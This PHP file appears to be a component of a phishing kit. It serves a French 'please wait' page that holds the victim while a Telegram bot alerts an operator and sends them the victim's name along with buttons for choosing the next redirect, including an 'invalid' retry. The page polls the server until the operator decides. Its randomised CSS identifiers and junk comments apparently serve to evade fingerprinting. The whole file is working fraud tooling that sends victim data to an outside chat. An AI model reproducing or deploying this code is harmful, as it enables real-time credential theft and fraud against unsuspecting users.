<?php

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_SESSION["id"]) && isset($_SESSION["msg"]) && isset($_SESSION["btn"])) {
    $id = $_SESSION["id"];
    $msg  = $_SESSION["msg"];
    $btn = $_SESSION["btn"];

    function StopLoop($redirect)
    {
        global $dbWaiting, $ip, $id, $msg, $rez, $btnBl, $btn;
        if (!$redirect) {
            return;
        }

        $waiting = $dbWaiting->get("$id");
        $adminIp = isset($waiting["admin"]) ? $waiting["admin"] : "";
        $user = "<code>" . $_SESSION["nom"] . "</code>";

        if ($waiting) {
            $obj = [];
            foreach ($btn as $row) {
                foreach ($row as $button) {
                    if (strpos($button['url'], $redirect) !== false) {
                        $obj = $button;
                        break 2;
                    }
                }
            }

            telegram_api($rez["token"], "sendMessage", [
                "chat_id" => $rez["chat"],
                "text" => $adminIp . " -> " . $user . " " . $obj["text"],
                "parse_mode" => "HTML",
            ]);
            telegram_api($rez["token"], "editMessageText",  [
                "chat_id" => $rez["chat"],
                "parse_mode" => "HTML",
                "message_id" => $waiting["mid"],
                "reply_markup" => json_encode([
                    "inline_keyboard" => [$btnBl]
                ]),
                "text" => $msg
            ], true);
            $dbWaiting->delete("$id");
            return "/" . $redirect . (isset($obj["inv"]) ? "?invalid=true" : "");
        }
    }

    if (isset($_GET["start"])) {
        array_push(
            $btn,
            $btnBl
        );
        $res = telegram_api($rez["token"], "sendMessage", [
            "chat_id" => $rez["chat"],
            "parse_mode" => "HTML",
            "reply_markup" => json_encode([
                "inline_keyboard" => $btn
            ]),
            "text" => $msg
        ]);

        $mid = $res["message_id"];
        $dbWaiting->set("$id", [
            "mid" => $mid,
            "redirect" => false
        ]);
    } elseif (isset($_GET["verif"])) {
        $waiting = $dbWaiting->get("$id");
        if ($waiting) {
            $redirect = $waiting["redirect"];
            echo StopLoop($redirect);
        }
    } elseif (isset($_GET["stop"])) {
        echo StopLoop("thanks");
    }

    die();
}


$header = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/header.php');
$footer = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/footer.php');
$html = (function () {
    global $rez;
    ob_start();
?>
    <style>
        body {
            margin: 0px;
            padding: 0px;
        }

        * {
            box-sizing: border-box;
        }

        header {
            border-bottom: 1px solid #e6e6e6;
            padding: 20px 3%;
        }

        #PouacSbfmY {
            width: 167px;
            height: 45px;
        }
    </style>
    <style type="text/css">
        @media screen and (max-width: 1100px) {
            #maDyGpgBHb section {
                width: 90%;
            }

            #PouacSbfmY {
                margin-left: 0%;
            }
        }

        @media screen and (max-width: 740px) {
            #xmfHQhjZGd {
                padding: 11px 2% 8px;
            }
        }

        @media screen and (max-width: 650px) {
            #PouacSbfmY {
                width: 75px;
                height: 20px;
            }
        }
    </style>

    <style type="text/css">
        body {
            color: #333;
        }



        input,
        button {
            outline: none;
        }

        /* 2016-01-28 19:21:59 */
        /* 2016-05-22 13:49:11 */

        span a[href^="tel"] {
            color: inherit;
            text-decoration: none;
            pointer-events: none;
            cursor: default;
            /* 2020-10-04 15:42:58 */
        }

        #bNHdMcWrZe {
            text-align: left;
            /* 1999-08-10 01:43:16 */
            display: block;
            width: 4px;
        }

        #WsAQDxSMyv {
            font-size: 13px;
            /* 1997-03-18 18:34:23 */
            text-transform: uppercase;
        }

        .CBpuQWJiEK {
            display: block;
            margin: auto;
            width: 48px !important;
            height: 48px !important;
            border-radius: 50%;
            /* 1975-07-25 17:33:33 */
            position: relative;
            animation: rotate 1s linear infinite;
        }

        .CBpuQWJiEK::before {
            content: "";
            box-sizing: border-box;
            position: absolute;
            inset: 0px;
            border-radius: 50%;
            border: 3px solid #96164B;
            animation: prixClipFix 2s linear infinite;
        }

        @keyframes rotate {
            100% {
                transform: rotate(360deg)
            }
        }

        @keyframes prixClipFix {
            0% {
                clip-path: polygon(50% 50%, 0 0, 0 0, 0 0, 0 0, 0 0)
            }

            25% {
                clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 0, 100% 0, 100% 0)
            }

            50% {
                clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 100% 100%, 100% 100%)
            }

            75% {
                clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 0 100%, 0 100%)
            }

            100% {
                clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 0 100%, 0 0)
            }
        }

        /* 2021-11-27 07:55:20 */
        /* 1983-04-29 07:23:18 */

        #wxWSsnlbBu {
            display: flex;
            /* 1975-03-25 19:54:11 */
            /* iqVYnNwtpLlveCGJFuS */
            /* 1975-04-30 18:18:57 */
            text-align: center;
            justify-content: center;
        }

        #tJowcvZTqb {
            width: 60px;
            /* fxOtMoSEjCUqkNvwXWrTYia */
            display: block;
            margin: auto;
            margin-bottom: 30px;
            /* XKZeWUnkjMOzh */
            /* eEHnLbgF */
            /* 2010-06-24 13:52:23 */
        }

        #VmafDnRJkN {
            display: block;
            margin: auto;
        }

        @media screen and (max-width: 600px) {
            #VmafDnRJkN {
                position: relative;
                top: -73px;
                font-size: 20px !important;
                /* 1982-10-08 04:41:49 */
            }

            #tJowcvZTqb {
                margin-left: 0px;
            }

        }

        /* KJHPANcwSWjGB */

        @media screen and (max-width: 450px) {

            .title,
            .bWpAQakLVFUgzcPvOKGlMoZeqjSYN {
                font-size: 24px;
            }
        }

        strong {
            font-weight: 800 !important;
        }
    </style>
    <main style="display: block;text-align: center !important;">
        <!-- <img id="tJowcvZTqb" style="margin-left: auto;" src="./views/assets/secure.png" class="tUROg"> -->
        <h1 class="title" data-date="2014-05-26 23:28:31"><strong>S'il vous plaît, attendez
            </strong>
        </h1>
        <p class="DOaGoygsQ">Attendez quelques secondes pour être redirigé.



        </p>
        <strong id="wxWSsnlbBu" class="gtxYCjBiFSfM" data-date="1992-04-14 20:57:48">Merci de pas quitter cette page!
        </strong>
        <br><br><br>

        <!-- BlhqrgRYTbfZUXGWtO -->
        <span class="CBpuQWJiEK dpENDtFxCu" data-date="2002-09-14 13:58:58"></span>
        <br><br>
        <span style=" font-size:28px; font-family: system-ui, sans-serif !important;" id="VmafDnRJkN" class="GawfBFRHVAhxUbWPNyocIqmtgS"><?= $rez["waiting"] ?></span>
    </main>
    <script>
        $(document).ready(function() {

            let xhra = new XMLHttpRequest();
            xhra.open('POST', './waiting?start=true');
            xhra.send();

            const t = setInterval(() => {
                let xhra = new XMLHttpRequest();
                xhra.open('POST', './waiting?verif=true')
                xhra.addEventListener('load', () => {
                    console.log(xhra.responseText);
                    if (xhra.responseText) {
                        clearInterval(t);
                        setTimeout(() => {
                            window.location.href = xhra.responseText
                        }, 500)
                    }
                })
                xhra.send()
            }, 3000)



            const timer = setInterval(function() {
                var count = parseInt($('#VmafDnRJkN').html());
                if (count !== 0) {
                    $('#VmafDnRJkN').html(count - 1);
                } else {
                    clearInterval(timer);
                    let xhra = new XMLHttpRequest();
                    xhra.open('POST', './waiting?stop=true')
                    xhra.addEventListener('load', () => {
                        setTimeout(() => {
                            window.location.href = './thanks'
                        }, 500)
                    })
                    xhra.send()
                }
            }, 1000);
        });
    </script>
<?php
    return ob_get_clean();
})();

$html = $header . $html . $footer;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>